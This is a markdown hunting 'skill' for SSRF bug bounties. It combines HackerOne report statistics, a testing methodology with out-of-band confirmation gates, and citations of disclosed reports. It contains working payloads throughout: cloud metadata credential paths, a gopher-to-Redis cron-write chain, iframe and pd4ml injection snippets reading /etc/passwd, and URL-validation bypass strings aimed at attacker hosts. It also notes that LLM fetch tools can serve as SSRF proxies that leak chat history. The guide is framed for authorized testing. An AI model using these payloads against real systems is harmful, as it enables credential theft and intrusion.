---
name: ssrf
description: >-
  Hunting skill for ssrf vulnerabilities. Built from 15 public bug bounty reports including AWS metadata
  SSRF (HackerOne $25k Analytics PDF, Shopify Exchange $25k, Capital One 106M-record breach,
  Dropbox/HelloSign $4,913), GCP metadata SSRF (Snapchat $4k), Azure IMDS SSRF (Azure DevOps $15k chain,
  ChatGPT Custom Actions MSRC), DNS rebinding SSRF (Concrete CMS, GitLab UrlBlocker), gopher-protocol-to-
  Redis-RCE (Yahoo Mail $15k), link-preview SSRF (Reddit Matrix $6k), and headless-browser PDF-generator
  SSRF chains. Use when hunting SSRF on any target — OOB Collaborator confirmation mandatory for blind
  cases. Combined with the HackerOne field guide (real disclosed-report data: where it pays, quick wins,
  payload banks). Hunt SSRF and server-side request primitives. Use when testing URL fetchers, webhooks,
  image importers, PDF generators, and integrations. Backed by 337 disclosed HackerOne reports.
---

# SSRF — Combined Field Guide

**Merged skill.** This fuses two complementary sources into one reference:

- **Part 1 — HackerOne field guide:** statistics from disclosed reports, "where it pays," quick wins, and curated payload banks.
- **Part 2 — Bug hunter methodology:** autonomous testing priority, canary discipline, crown-jewel targeting, OOB/validation gates, and reporting guidance.

**How to use:** Open with Part 2 for execution discipline (set your canary, know your success/failure gate). Use Part 1 to prioritize targets and pull payloads. Before reporting, run the validation gates in both parts.

---

<!-- ============ PART 1: HACKERONE FIELD GUIDE (data + payloads) ============ -->

# Server-Side Request Forgery (SSRF) — HackerOne field guide

Built from **337** publicly disclosed HackerOne reports (2014–2026). Corpus: `~/.local/share/hackerone-reports/`.

**Reference files (load on demand):**

- `references/payloads.md` — payload banks, probes, wordlists, Nuclei templates, observed parameters
- `references/techniques.md` — quick wins, bypasses, real-report techniques, deeper checklists

## Signal

- Reports: **337** · paid: **105**
- Median bounty **$700** · p90 **$4,263** · max **$25,000** · total **$178,859**
- Median upvotes **22**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| HackerOne | 7 | $31,500 | 931 |
| Dropbox | 2 | $22,489 | 662 |
| GitLab | 18 | $19,750 | 1582 |
| Internet Bug Bounty | 7 | $16,043 | 217 |
| Mail.ru | 36 | $15,150 | 1549 |
| Open-Xchange | 15 | $10,250 | 396 |
| Lark Technologies | 5 | $8,000 | 539 |
| LY Corporation | 5 | $6,050 | 250 |

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`url` `uri` `link` `image` `avatar` `webhook` `callback` `feed` `proxy` `next` `dest` `host` `domain` `site` `fetch` `load`

## Tools

`interactsh` · `Burp Collaborator` · `ssrfmap` · `httpx` · `ffuf`

## Escalation chains

- Metadata -> cloud keys -> S3/account takeover.
- Internal admin panel -> RCE.
- Redis/Memcached via gopher -> RCE.

## Related

- `open-redirect` (385 reports)
- `rce` (1,399 reports)
- `info-disclosure` (1,827 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

## Crown Jewel Targets

SSRF is highest-value when the target runs on cloud infrastructure (AWS, GCP, Azure) where metadata services expose credentials, or when the server sits inside a complex internal network (Kubernetes clusters, microservice meshes, internal APIs). Priority targets:

- **Cloud-hosted SaaS products** (GCP metadata at `169.254.169.254` or `metadata.google.internal`, AWS IMDSv1)
- **Kubernetes/orchestration platforms** — aggregated API servers, metrics-server, kubelet endpoints expose privileged cluster operations
- **Internal developer tooling** — CI/CD, workflow orchestration (Flyte, Argo), admin panels not exposed externally
- **Link preview / URL fetching features** — Reddit-style preview APIs, Slack-style unfurling, media processors
- **Dataset/file import pipelines** — anything that fetches remote URLs on behalf of a user
- **Enterprise self-hosted software** (GitHub Enterprise, GitLab) — SSRF frequently chains to RCE via internal services

Payouts are highest when SSRF reaches: cloud credentials → account takeover, internal admin APIs → data exfil, or chains to RCE.

---

## OOB-Or-It-Didn't-Happen Gate (Read First)

**Claims of blind SSRF require an out-of-band (OOB) confirmation. Always. No exceptions.**

OOB means: a Burp Collaborator domain, an `interactsh-client` listener, a canarytoken, or any DNS+HTTP receiver you control that confirms the server actually made an outbound network connection on your behalf.

### What is NOT confirmation of SSRF

- The server **echoing your URL back in an error message**. Example: `"The Web application at http://evil.example.com/x could not be found"` — this is the server formatting your input into an error string, NOT making an outbound HTTP request. The error came from string formatting, not from network failure.
- The server returning a different status code for an external URL vs `localhost`. Different error responses can come from URL-scheme validators, not from actual fetching.
- A delayed response when the URL is sent. Delay can come from DNS resolution attempts within the parser, not from completed HTTP fetches.

### What IS confirmation of SSRF

- A DNS lookup for your unique Collaborator subdomain appears in the OOB listener.
- An HTTP request to your Collaborator HTTP endpoint with the server's source IP and User-Agent.
- For SSRF in JavaScript-execution contexts (PDF renderers, headless browsers), a fetch from the server to your callback URL.

### Default workflow

1. **Plant the Collaborator payload first.** Sub-tagging (`dlsrcurl.<collab>`,
   `import.<collab>`) only works if your listener actually reports the queried
   subdomain back to you — **verify that before relying on it.** Burp's
   `get_collaborator_interactions` keys results by **payload ID, not by subdomain**,
   so several sub-tags generated from one payload are indistinguishable in the
   output. When that is the case, **generate a fresh payload per candidate
   parameter** and send exactly one request per payload.
2. **Send the request** to the target endpoint.
3. **Wait 30–120 seconds**, then poll the OOB listener.
4. **Only after a confirmed callback** do you claim SSRF.
5. If zero callbacks across all sub-tagged sinks: SSRF claims must be retracted, even if error messages echo URLs.

**Lesson from a authorized engagement:** SharePoint's `/_layouts/15/download.aspx?SourceUrl=` returned 500 with the title `"The Web application at <attacker-URL> could not be found"`. Initial scan flagged this as SSRF (server clearly processed the URL). 38 Collaborator-tagged payloads across 12+ URL-accepting parameters yielded **zero DNS or HTTP interactions**. The "echo" was client-side error-string formatting; the server never made an outbound HTTP request. The path is actually an SP-internal `SPFile`/`SPWebApplication` resolver, not a generic URL fetcher. Reporting this as SSRF would have been N/A'd at triage.

### Attribute the callback to ONE parameter before reporting

A callback proves the server made a request. It does **not** tell you which
parameter caused it, and the fix depends entirely on that.

```
BAD   — four candidate fields, one payload, fired in one batch
        -> callbacks arrive, attribution impossible, retest required

GOOD  — fresh payload per field, one request each, poll between
        url      -> callbacks    <- this is the sink
        apiUrl   -> none
        endpoint -> none
        target   -> none
```

**Run the negative control.** A parameter that produces *no* callback is evidence,
and it belongs in the report — it is what lets the client fix the right field
instead of allowlisting the wrong one.

**Lesson from an authorized engagement.** A server-side request-forwarding endpoint
accepted both `url` and `apiUrl`. The application's own stored config used `apiUrl`,
so that was the obvious suspect — but `apiUrl` was inert and **`url` was the live
sink**.
Batch-firing both had produced callbacks with no attribution; only per-payload
isolation identified the real parameter. A report naming `apiUrl` would have sent
the client to patch a field that does nothing.

### Blind vs full-read — establish which before scoring

After a callback confirms the request leaves the server, **check whether the
upstream response body is returned to you.** These are different findings:

- **Blind** (callback only, no body): on the never-submit list standalone. Needs an
  internal service reached, or data returned, to be reportable.
- **Full-read** (upstream body in the response): substantially higher severity —
  read arbitrary internal endpoints directly.

```bash
# one request settles it: fetch something with a known, recognisable body
-d '{"url":"https://example.com/"}'
# {"statusCode":200,"data":"<!doctype html>...<title>Example Domain</title>..."}
#                          ^ body returned = full-read, not blind
```

Also body-diff a known-internal target against a known-external one. A **distinct
status** on a link-local address (e.g. `401` from `169.254.169.254` where every
other target returns `200`) is the metadata service answering — that proves reach
to a non-internet-routable address, which a status code alone otherwise cannot.


---

## Attack Surface Signals

### URL Patterns to Hunt
```
/api/*/preview
/api/*/fetch
/api/*/import
/api/*/webhook
/api/*/proxy
/api/*/render
/api/*/link
/api/*/screenshot
/api/*/export
/api/*/validate
?url=
?uri=
?endpoint=
?redirect=
?src=
?source=
?feed=
?host=
?target=
?dest=
?file=
?path=
?callback=
?image=
?load=
?fetch=
```

### JS Patterns (in client-side code)
```javascript
// Look for these in JS bundles
fetch(userInput)
axios.get(params.url)
XMLHttpRequest + variable URL
url: req.body.url
src: params.source
href: query.endpoint
```

### Response Header Signals
```
X-Forwarded-For headers echoed back
Server: internal-service
Via: 1.1 internal-proxy
X-Cache headers revealing internal hostnames
```

### Tech Stack Signals
- **Kubernetes** — any public-facing aggregated API, metrics endpoints
- **GCP** — any service fetching URLs that runs on Compute Engine/GKE
- **Node.js/Python** with URL-fetching libraries (`requests`, `node-fetch`, `axios`)
- **Headless browsers** (Puppeteer, PhantomJS) used for screenshots/PDF — extremely high value
- **XML/DSPL/CSV import features** — XXE-style SSRF vector
- **OAuth/webhook registration** endpoints

---

## Step-by-Step Hunting Methodology

1. **Map all URL-input parameters** across the target: spider JS files for fetch calls, check all API docs, look for file-import, link-preview, webhook, image-proxy, and redirect features.

2. **Set up an out-of-band detection server** using Burp Collaborator, interactsh, or `https://canarytokens.org` — you need a unique per-test DNS/HTTP callback domain.

3. **Send your callback URL as the parameter value first** (blind SSRF check before anything else):
   ```
   url=https://YOUR.interactsh.com/test
   ```
   Confirm the server makes an outbound connection. This proves execution before attempting internal targets.

4. **Test internal cloud metadata endpoints**:
   - GCP: `http://metadata.google.internal/computeMetadata/v1/`
   - AWS: `http://169.254.169.254/latest/meta-data/`
   - Azure: `http://169.254.169.254/metadata/instance`

5. **Test localhost and common internal ports**:
   ```
   http://localhost/
   http://127.0.0.1:8080/
   http://127.0.0.1:6443/  (Kubernetes API)
   http://127.0.0.1:2379/  (etcd)
   http://127.0.0.1:9090/  (Prometheus)
   http://127.0.0.1:9200/  (Elasticsearch)
   ```

6. **Check for redirect-based SSRF** — if the endpoint validates the initial URL but follows 30x redirects, host a redirect server pointing to internal addresses. Kubernetes report (Report 3) was specifically triggered by hijacked API servers returning 30x responses.

7. **Test JavaScript-execution contexts** (headless browsers, PDF renderers):
   - Inject `<script>` tags that make `XMLHttpRequest` or `fetch()` calls to internal services
   - Exfil via DNS: encode response data in subdomain of your callback domain

8. **Enumerate the internal network** using timing differences and error message variations:
   - Port scan via response time (`connection refused` vs timeout)
   - Check error messages for hostname/IP leakage

9. **Chain findings** — if you have SSRF to internal services, look for:
   - Unauthenticated admin endpoints
   - Redis, memcached (protocol smuggling)
   - Internal OAuth token endpoints
   - SSRF → CSRF → RCE (GitHub Enterprise pattern)

10. **Document the full chain** with screenshots of each hop before reporting.

---

## Common Root Causes

1. **"The user said it was safe"** — Developers trust user-supplied URLs for fetching remote resources (link previews, thumbnails, webhooks) without validating the destination. The feature is legitimate; the missing validation is the bug.

2. **Allowlist bypass via redirects** — Developers validate the initial URL against an allowlist but configure HTTP clients to follow redirects automatically. An attacker's server on the allowlist redirects to an internal address.

3. **Aggregated/proxy API trust** — Kubernetes-style architectures where an API aggregation layer blindly proxies 30x responses from registered extension servers. Compromising a single extension server gives SSRF into the core API.

4. **Server-side rendering without sandboxing** — Headless browser features (PDF generation, link preview screenshots) execute attacker-controlled JavaScript in a network-privileged context with access to metadata services.

5. **XML/DSPL/file parsers fetching external entities** — Import features that parse structured files (XML, DSPL, CSV with remote schemas) fetch attacker-controlled URLs, often with no URL validation at all.

6. **Internal hostname leakage via response differences** — Services return different error messages, timing, or response sizes for internal vs. external hosts, enabling blind enumeration even when content isn't returned.

7. **IMDSv1 still enabled** — Cloud deployments that haven't migrated to IMDSv2 (AWS) or haven't required the `Metadata-Flavor` header (GCP) allow unauthenticated credential access from any SSRF.

---

## Gate 0 Validation

Before writing the report, confirm all three:

1. **What can the attacker DO right now?**
   - Can you retrieve a response proving internal network access? (Show the metadata token, internal API response, or confirmed DNS callback)
   - If blind: can you demonstrate port differentiation or confirmed OOB callback tied to a specific internal address?
   - "The server makes a request" alone is insufficient — show *where* it goes and *what comes back*.

2. **What does the victim LOSE?**
   - Cloud credentials (IAM tokens) → full cloud account compromise?
   - Internal service data (user PII, secrets, API keys)?
   - Ability to pivot to RCE via internal admin service?
   - If the answer is only "the server fetches my URL," severity is low — quantify the actual reachable blast radius.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Is the vulnerable endpoint still live and the parameter still present?
   - Does your callback server show the hit reliably (not intermittently)?
   - Can a second person follow your steps without prior knowledge and get the same result?
   - If reproduction requires specific timing, tokens, or luck — resolve the flakiness before submitting.

---

## Real Impact Examples

### Scenario A: Cloud Credential Exfiltration via Link Preview (Snapchat/GCP Pattern)
A public-facing "link preview" API accepted a `url` parameter and fetched the target server-side to generate thumbnail content. The feature ran on GCP Compute Engine with IMDSv1 enabled and no `Metadata-Flavor` header enforcement on the server side. By supplying `url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`, the attacker received a valid OAuth2 access token for the instance's service account. The token granted access to internal GCP project resources including storage buckets containing user data. The attacker used JavaScript execution within a headless rendering context to exfiltrate the token via DNS-encoded subdomains, bypassing response body restrictions.

### Scenario B: Kubernetes API Compromise via Hijacked Aggregated Server (Kubernetes Pattern)
An attacker who could register a Kubernetes API extension server (metrics-server equivalent) returned `302 Location: http://127.0.0.1:6443/api/v1/secrets` responses to the aggregation layer. Because the aggregation proxy followed redirects automatically without re-validating the destination against the internal network blocklist, the redirect caused the aggregation layer itself (running with elevated cluster credentials) to fetch internal Kubernetes API secrets and return them in the response. This effectively allowed an attacker with limited API registration privileges to escalate to full cluster secret read access — a critical privilege escalation via SSRF chained through trusted infrastructure components.

---

## Disclosed Report Citations (Backfill +6 — 2018-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Cloud-metadata SSRFs across all three providers, DNS rebinding, gopher-to-Redis-RCE, link-preview SSRF, and headless-browser/PDF-generator chains are all represented.

3. **HackerOne — SSRF in Analytics Reports (PDF generator → AWS metadata)** ([H1 #2262382](https://hackerone.com/reports/2262382) · [Writeup](https://osintteam.blog/25-000-ssrf-in-hackerones-analytics-reports-b9a5b3aa3d6e))
    - Subclass: headless-browser SSRF (PDF generator) → AWS metadata SSRF (IMDSv1)
    - Payload: injected `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` into a template element rendered server-side; backend Ruby loop rendered the untrusted template HTML into PDF, reflecting IMDS response inside the rendered PDF / error message
    - Root cause: unsanitised user-controlled template fragment reflected in PDF rendering pipeline; no IMDSv2 enforcement
    - Year: 2023 — **$25,000** (CVSS 10.0 Critical)

4. **Shopify Exchange — SSRF in screenshot service → GCP metadata → container root** ([H1 #341876](https://hackerone.com/reports/341876))
    - Subclass: GCP metadata SSRF → SSRF-to-RCE chain
    - Payload: created store on partners.shopify.com, edited `password.liquid` template to embed a request to `http://metadata.google.internal/computeMetadata/v1/` with `Metadata-Flavor: Google`, then triggered the Exchange screenshotting service to render the template server-side
    - Root cause: screenshotter fetched user-controlled template with no metadata-host blocklist and no metadata-concealment proxy
    - Year: 2018 — **$25,000** (canonical headless-browser → metadata)

5. **Concrete CMS — SSRF mitigation bypass via DNS rebinding → AWS IAM keys** ([H1 #1369312](https://hackerone.com/reports/1369312))
    - Subclass: DNS rebinding SSRF → AWS metadata SSRF (IMDSv1)
    - Payload: file-upload-from-URL feature; attacker DNS server alternated `A` records between `1.2.3.4` (public) and `169.254.169.254`; needed 2-3 requests to win the race between validation and fetch; final request retrieved IAM role credentials
    - Root cause: validated hostname by resolving once; download path re-resolved DNS without pinning the validated IP
    - Year: 2021 — fixed in 8.5.7 / 9.0.1

6. **Yahoo Mail — Blind SSRF → Gopher → Redis RCE** ([Writeup](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530))
    - Subclass: gopher protocol abuse → Redis SSRF → SSRF-to-RCE chain
    - Payload: blind SSRF in Yahoo Mail backend reached via `gopher://internal-redis:6379/_*1%0d%0a$8%0d%0aflushall...SET stuff /var/spool/cron/root...BGSAVE` — wrote a cron via Redis to get command execution
    - Root cause: gopher scheme not blocklisted; internal Redis unauthenticated on default port; SSRF target accepted 302 redirect from attacker host to `gopher://`
    - Year: 2020 — **$15,000**

7. **Reddit Matrix — Blind SSRF in `preview_url` API** ([H1 #1960765](https://hackerone.com/reports/1960765))
    - Subclass: link-preview SSRF (blind, internal port-scan via timing/response codes)
    - Payload: `GET https://matrix.redditspace.com/_matrix/media/r0/preview_url/?url=http://10.0.0.0:80/` — varied internal IPs/ports; service names and IPs leaked through response differences before the fix
    - Root cause: link-preview fetcher did not reject RFC1918 / link-local destinations; allowlist-by-scheme only
    - Year: 2023 — **$6,000**

8. **Azure DevOps — SSRF in Service Hooks + DNS rebinding bypass in endpointproxy** ([Binary Security writeup](https://www.binarysecurity.no/posts/2025/01/finding-ssrfs-in-devops))
    - Subclass: webhook URL field SSRF + DNS rebinding SSRF → Azure IMDS / managed identity
    - Payload: configured service-hook webhook URL or `endpointproxy` URL parameter to attacker rebinding host; second resolution returned `169.254.169.254`; chained CRLF injection to set required `Metadata: true` header for Azure IMDS
    - Root cause: validation-then-fetch with separate DNS lookups; CRLF in URL path injected headers needed by Azure IMDS
    - Year: 2023-2024 — **$15,000 total** across 3 reports

---

## Related Skills & Chains

- **`cloud-iam-deep`** — SSRF is the canonical entry to cloud metadata service. Chain primitive: SSRF → IMDSv1 token theft → `cloud-iam-deep` privilege escalation reaches `iam:CreateUser` / `sts:AssumeRole` on cross-account roles.
- **`llm-ai`** — LLMs with fetch_url tools become SSRF proxies bypassing network egress controls. Chain primitive: LLM tool-use (fetch_url) + SSRF → attacker URL exfils chat history and IMDS token from the LLM container.
- **`rce`** — Internal Redis/Memcached are unauthenticated by default and reachable via gopher://. Chain primitive: SSRF + Gopher → internal Redis `CONFIG SET dir` + RCE via cron / SSH authorized_keys write.
- **`cloud-misconfig`** — Internal-only buckets/APIs become reachable through SSRF egress. Chain primitive: SSRF + DNS rebinding → SSRF-protected-endpoint bypass → internal /admin or private S3 bucket read.
- **`security-arsenal`** — Load the SSRF IP Bypass Table (11 techniques: decimal IP, IPv6 mapped, octal, suffix dot, DNS rebinding, redirect chain, etc.) before testing filters.
- **`triage-validation`** — Apply the OOB-Or-It-Didn't-Happen gate: every blind SSRF claim requires a Burp Collaborator hit with a unique marker before report submission.

## Web-Research Methodology Additions (2026)

Sourced from current PortSwigger Web Security Academy / Research, HackTricks, and a 2026 GitHub Security Advisory (see D). These extend — not replace — the OOB gate above: every blind claim still needs a Collaborator/interactsh hit.

### A. Discovery checklist — concrete places, parameters, headers, file types, and workflows to look for this bug class

- **Full-URL parameters (obvious sinks):** `url`, `uri`, `link`, `src`, `source`, `dest`, `target`, `endpoint`, `fetch`, `load`, `image`, `avatar`, `webhook`, `callback`, `feed`, `proxy`, `next`, `redirect`, `return`, `rurl`.
- **Partial-URL / hostname-only inputs** (PortSwigger "hidden attack surface"): params carrying only a host or path that are concatenated into a full URL server-side — `host=`, `domain=`, `path=`, `file=`. They are easy to miss because the value does not look like a URL.
- **URLs inside data formats:** XML/XXE external entities, DSPL/CSV remote schemas, SVG `<image xlink:href>`, JSON bodies with `url` / `@id` / `contentUrl`, feed (RSS/Atom) parsers, webhook registration, OAuth/SSO metadata-URL fields.
- **Non-obvious header surface:** the `Referer` header is a documented blind-SSRF sink (server-side analytics visitors fetch third-party URLs seen in Referer). Also test `X-Forwarded-Host`, `X-Original-URL`, `Host`, `Origin` when reflected into fetches.
- **File types that render server-side:** PDF generators (wkhtmltopdf, WeasyPrint, PDFBox, pd4ml), screenshotters (Puppeteer/Playwright/PhantomJS), image processors, document converters.
- **JS bundle grep:** `grep -Eo "fetch\(|axios\.[a-z]+\(|XMLHttpRequest|URL\(" bundle.js` then verify a user variable actually reaches the URL argument.

Server-side-rendering injection shapes (HackTricks / YesWeHack):
```
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<pd4ml:attachment src="/etc/passwd" description="attachment sample" icon="Paperclip" />
<meta http-equiv="refresh" content="0; file:///etc/hosts">
```

- **Workflow:** (1) spider + `ffuf`/`katana` for the endpoint patterns; (2) plant one unique `interactsh-client` / Collaborator payload per candidate parameter; (3) confirm DNS+HTTP callback before touching internal targets; (4) only then aim at metadata services.

Metadata endpoints to try once a sink is confirmed (HackTricks cloud-ssrf):
```
AWS IMDSv1   http://169.254.169.254/latest/meta-data/iam/security-credentials/
AWS IMDSv2   needs PUT /latest/api/token + X-aws-ec2-metadata-token header
AWS IPv6     http://[fd00:ec2::254]/latest/meta-data/   (Nitro, IPv6 enabled)
AWS ECS      http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI  (read /proc/self/environ first)
AWS EKS      http://169.254.170.23/v1/credentials  (+ token from /var/run/secrets/pods.eks.amazonaws.com/...)
GCP          http://metadata.google.internal/computeMetadata/v1/  (header Metadata-Flavor: Google)
GCP token    .../instance/service-accounts/default/token ; ID token: .../default/identity?audience=https://target
Azure VM     http://169.254.169.254/metadata/instance?api-version=2021-12-13  (header Metadata: true, NO X-Forwarded-For)
Azure nohdr  http://169.254.169.254/metadata/v1/instanceinfo  (no Metadata header required)
App Service  $IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01 (+ X-IDENTITY-HEADER)
Alibaba      http://100.100.100.200/latest/meta-data/
DigitalOcean http://169.254.169.254/metadata/v1.json
Oracle OCI   http://169.254.169.254/opc/v2/instance/  (header Authorization: Bearer Oracle)
etcd         http://127.0.0.1:2379/v2/keys/?recursive=true
```

### B. Techniques & bypasses — specific actionable techniques and payload shapes, not generic advice

- **Blacklist bypass (PortSwigger):** alternative loopback representations `2130706433`, `017700000001`, `127.1`, `0`, `0x7f000001`; a domain you control resolving to `127.0.0.1`; URL-encoding / case variation / double-encoding of blocked strings.
- **Whitelist bypass via URL-parser confusion:** credentials `@` (`https://allowed.com:pass@evil.com/`), fragment (`https://evil.com#allowed.com`), DNS hierarchy (`https://allowed.com.evil.com`), double-encoded `#` (`%2523`). PortSwigger lab chain: `http://username%2523@stock.weliketoshop.net/` made the back end connect to host `username`.
- **PortSwigger URL validation bypass cheat sheet** (Intruder-friendly wordlist) — representative shapes:
```
https://%09web-attacker.com/                 ; https://[::1]/ ; https://[::ffff:127.0.0.1]/
https://%40/                                 ; http:\\web-attacker.com\ ; https://\l\o\c\a\l\h\o\s\t/
https://00000177.00000000.00000000.00000001/ ; https://127.1/ ; https://%E2%91%AB7.0.0.2/
https://%E2%80%8Blocalhost/                  ; https://localho%EF%AC%86/
https://example.com%2523web-attacker.com/    ; https://example.com?%40web-attacker.com/
https://web-attacker.com.example.com/        ; https://example.com.;.web-attacker.com/
%0Dhttp%0D://web-attacker.com                ; %1Chttp://web-attacker.com
```
- **Redirect-based filter bypass:** point the allowlisted URL at an open redirect on the allowed host — `/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin` — or host your own 302/303/307 to `169.254.169.254`. Switching `http:`→`https:` during the redirect has defeated some anti-SSRF filters; vary status code and protocol with a small Python redirect server or `ffuf`.
- **DNS rebinding (TOCTOU) — 2026 advisory pattern, CVE-2026-54020 (Open WebUI):** validator resolves the hostname once, HTTP client resolves again at connect time. Serve TTL=0 answers alternating a public IP and `169.254.169.254` (`rebind.network`, custom CoreDNS, `singularity-of-your-origin`). The advisory had five sibling sinks — retrieval loader, content probe, chat `image_url`, image edit, OAuth picture fetch — so after one is fixed, re-test every other fetch path. A real fix pins the validated IP at the connection layer (transport adapter), not ahead of it.
- **Gopher protocol smuggling:** if `gopher://` is allowed, `gopherus --exploit redis` / `--exploit mysql` / `--exploit fastcgi` emits a URL issuing raw TCP commands (Redis `CONFIG SET dir /var/spool/cron` + `BGSAVE` → cron RCE). Some HTTP clients need a 302 from the attacker host to the gopher URL first.
- **CRLF header injection into IMDS:** when the sink will not let you set headers directly, inject `Metadata: true` (Azure) or `Metadata-Flavor: Google` (GCP) via `%0D%0A` in a URL path/header field. The Azure DevOps Service Hooks report chained exactly this with rebinding to reach IMDS.

### C. Validation / proof bar — how to confirm the bug and avoid false positives

- **OOB gate is mandatory (Part 2 above):** one unique Collaborator/interactsh DNS+HTTP interaction per candidate field is the minimum proof of a blind sink. A server echoing your URL in an error is NOT SSRF.
- **Full-read vs blind:** fetch `https://example.com/` and check whether its body is reflected (`<title>Example Domain</title>`). Reflected body = full-read, score higher. Body-diff a link-local target against an external one; a distinct status (e.g. `401` from `169.254.169.254`) proves reach to a non-routable address.
- **Quantify the metadata hit:** show the exact path and the returned token/role name (redact the secret) — "server reached 169.254.169.254" with no returned metadata is weak. For IMDSv2 show the PUT token step, or explicitly note the hop-limit/container constraint.
- **False-positive discipline for rebinding:** a callback that only arrives after many attempts can be a flaky DNS race. Require repeatability (e.g. 3/5 successes) and record the DNS answer sequence. Do not claim exploitability if validation is pinned at the connection layer.
- **Attribution & negative controls:** include at least one inert parameter that produces no callback so the client patches the real sink. Keep the PoC within scope — stop at token/role-name retrieval, do not pivot into the cloud account.
- **Reproducibility:** one curl/Burp Repeater request, a live listener, and a second tester who can repeat it in under 10 minutes.

### D. Sources — numbered list of the actual URLs you fetched

1. https://portswigger.net/web-security/ssrf
2. https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
3. https://github.com/advisories/GHSA-h6x2-583h-x99r
4. https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html
